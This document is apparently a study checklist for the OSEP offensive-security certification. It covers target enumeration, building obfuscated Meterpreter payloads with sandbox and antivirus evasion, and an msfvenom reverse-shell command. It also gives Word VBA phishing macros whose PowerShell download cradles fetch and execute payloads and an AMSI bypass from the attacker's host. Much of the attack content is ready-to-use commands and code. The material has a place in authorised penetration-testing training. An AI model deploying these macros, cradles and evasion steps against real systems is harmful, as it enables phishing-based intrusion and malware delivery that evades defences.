# Checklist for OSEP

## Enumeration

[] Switch on your apache server
[] Identify External vs Internal vs Vault IPs
[] Full nmap scan (TCP + UDP) against External Hosts
[] Note hostnames and update /etc/hosts
[] Re-scan against hostnames
[] Hostnames usually mean something. Put a remark in the table. For e.g, note things like clients, devs, DB etc
[] Web Services should be fully enumerated with feroxbuster/gobuster.
	[] Check Source Code for possible reveal of tech stack (ie .NET Razer)
	[] Login pages for default creds
	[] Wordpress sites to be wpscan
	[] file upload pages to be tested
[] DevOps stuff like gitlab, Ansible, Artifactory should be noted down as they will likely play a part further on
[] If there are fields for user input, please try SQL Injection, SSTI payloads. SQLMap can be very useful. For SSTI payloads, run the following:
```bash
# basically if the math resolves, it is vulnerable to code execution
{{4*4}}
@(3+2)
<%= 3 * 2 %>
```

## Meterpreter Payload Creation

[] Use Get-Shellcode (https://github.com/gh0x0st/Get-Shellcode) to obfuscate ps1 meterpreter shellcode
[] Slot that nice obfuscated shellcode into your ps1 shellcode runner. Remember to update the variables accordingly in the rest of the code. This has a 100% success rate on all OSEP Challenge Labs (CowMotors and DenkiAir included)
[] if you are creating an .exe payload from csharp, use Sleep, non-emulated APIs (such as VirtualAllocExNuma) for sandbox evasion, use multiple byte XOR to encrypt your payload
[] same idea for VBA
[] for .hta code, it is jscript; XOR the shellcode, do dotnet2js, prepend an obfuscated jscript into the output .hta file from dotnet2js
[] for prependmigrate, you need to set it up as a msfvenom option when creating a payload. Note that explorer may not always work if the target user is not an interactive user (such as svc accounts, IIS blah blah)
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=443 prpendmigrateprocess=explorer.exe prependmigrate=true -f exe > evil.exe
```

### Catching Meterpreter Shells

- x86 for MSWord vectors, x64 for everything else
- Consider setting AutoRunScript in the advanced options of exploit/multi/handler to run a process migration upon establishing the meterpreter shell to evade AV
- if it doesnt work, you may wish to use prepend migrate which is another form of migration but done earlier in the process of establishing the shell (might be more unstable but allegedly more evasive)
```
msf6 (exploit/multi/handler) > set AutoRunScript post/windows/manage/migrate
```

## Email Phishing Vector
[] Look out for hosts with smtp (Port 25 default) and see if there are any email addresses found
[] Use smtp-user-enum if unable to find email addresses


## MSDoc Phishing
[] if .doc related, start off with a simple ping payload to check connectivity and command execution
```vba
Sub MyMacro()
	Dim str As String
	str = "ping.exe <kali ip>"
	Shell str, vbHide
End Sub
```
[] if the above fires, use a powershell download cradle to fire off a meterpreter shell. Note that for MSWord, you need a x86 payload!
```vba
Sub MyMacro()
	Dim str As String
	str = "powershell.exe -nop -ep bypass -c IEX(New-Object System.Net.WebClient).Downloadstring('http://<kali ip>/amsi.txt')"
	str = "powershell.exe -nop -ep bypass -c IEX(New-Object System.Net.WebClient).Downloadstring('http://<kali ip>/simplerunner.txt')"
	Shell str, vbHide
End Sub
```
[] if (New-Object System.Net.WebClient) does not work you can use the following. Though if New-Object doesnt work, it is likely that IEX is disabled as well
```vba
Sub MyMacro()
	Set shel_obj = CreateObject("Wscript.Shell")
	shell_obj.Run "powershell.exe -ep bypass -c iwr http://kali/simplerunner.txt | IEX", 0
End Sub
```
[] if the above fails, likely powershell is restricted in some way or your meterpreter shell is caught (check for hits to your apache server)
[] Can consider a direct VBA Shellcode Runner (obfuscated shellcode) of course
[] if not, you can use get the VBA to download your compiled executable and execute it with InstalUtil


